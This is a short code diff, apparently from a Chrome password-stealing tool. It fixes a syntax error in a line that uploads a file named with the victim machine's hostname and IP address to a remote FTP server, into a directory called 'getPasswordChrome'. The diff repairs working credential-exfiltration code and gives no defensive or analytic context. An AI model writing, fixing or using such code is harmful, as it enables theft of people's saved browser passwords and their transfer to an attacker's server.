@@ -148,7 +148,7 @@ class ChromePass:
 			if "File exists" in str(e):
 				ftp.sendcmd('CWD getPasswordChrome')
 
-		ftp.storbinary("STOR " + socket.gethostname() + "-" + socket.gethostbyname(socket.gethostname())".txt", f)
+		ftp.storbinary("STOR " + socket.gethostname() + "-" + socket.gethostbyname(socket.gethostname()) + ".txt", f)
 
 		ftp.quit()
 
